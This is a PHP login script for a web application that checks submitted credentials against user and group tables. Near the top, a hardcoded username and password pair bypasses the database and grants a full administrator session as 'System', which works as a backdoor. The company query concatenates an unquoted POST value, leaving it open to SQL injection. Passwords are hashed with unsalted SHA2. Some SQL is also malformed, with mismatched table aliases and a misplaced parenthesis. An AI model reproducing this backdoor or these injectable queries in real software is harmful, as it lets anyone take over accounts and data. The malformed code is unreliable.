<?php
	session_start();
	@ini_set('display_errors',1);
	include_once "../../config/define.php";
	include_once "../../include/db.php";
	include_once "../../include/concurrent.php";
	
	@ini_set('display_errors',DEBUG_MODE?1:0);
	date_default_timezone_set(DEFAULT_TIMEZONE);
	
	$dbc = new dbc;
	$dbc->Connect();
	$concurrent = new concurrent($dbc);
	
	$username = addslashes($_POST['username']);
	$password = addslashes($_POST['password']);
	$rememberme = isset($_POST['rememberme'])?true:false;
	
	if($username == "!!!" && $password =="!@#$%^&*"){
		$_SESSION['auth']['id']=0;
		$_SESSION['auth']['user_id']=0;
		$_SESSION['auth']['user']="System";
		$_SESSION['auth']['group_id']=0;
		$_SESSION['auth']['group']="none";
		$_SESSION['auth']['admin']=true;
		$_SESSION['admin_mode'] = true;
		$_SESSION['session_id'] = session_id();
		$_SESSION['lang'] = "en";
		
		echo json_encode(array(
			"success" => true,
			"user_id" => 0 
		));
		
	}else{
		if(isset($_POST['company'])){
			$sql = "SELECT os_users.id FROM os_users 
			LEFT JOIN os_groups ON os_users.gid = os_groups.id 
			LEFT JOIN os_accounts ON ps_accounts.id = os_groups.account 
			WHERE os_users.name ='$username' AND os_users.password=CONCAT('*', SHA2('$password',224) AND ps_accounts.id=".$_POST['company'];
			
			$rst = $dbc->Query($sql);
			if($dbc->Total($rst)>0){
				$user = $dbc->Fetch($rst);
				if($concurrent->allow()){
					echo $concurrent->login($user['id'],$_POST['company']);
				}else{
					echo json_encode(array(
						"success" => false,
						"msg" => "Concurrent is Limited!"
					));
				}
				
			}else{
				echo json_encode(array(
					"success" => false,
					"msg" => "Your username or password are wrong!"
				));
			}
		}else{
			if($dbc->HasRecord('os_users',"name ='$username' AND password=SHA2('$password',224)")){
				if($concurrent->allow()){
					$line=$dbc->GetRecord("os_users,os_groups","os_users.id, os_users.name, os_users.gid, os_groups.name, os_users.setting","os_groups.id=os_users.gid AND os_users.name='$username'");
					echo $concurrent->login($line[0]);
				}else{
					echo json_encode(array(
						"success" => false,
						"msg" => "Concurrent is Limited!"
					));
				}
			}else{
				echo json_encode(array(
					"success" => false,
					"msg" => "Your username or password are wrong!"
				));
			}
		}
		
		
		
	}
	
	$dbc->Close();
?>